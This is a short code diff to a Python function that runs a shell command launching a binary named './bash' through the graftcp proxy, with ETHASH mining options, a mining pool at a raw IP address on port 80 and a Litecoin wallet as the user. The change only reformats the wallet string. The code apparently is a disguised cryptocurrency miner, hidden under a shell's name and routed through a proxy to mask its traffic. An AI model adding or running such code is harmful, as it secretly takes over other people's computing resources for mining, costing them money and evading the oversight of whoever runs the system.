@@ -78,7 +78,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.01 --ethstratum ETHPROX
+    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.01 --ethstratum ETHPROX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
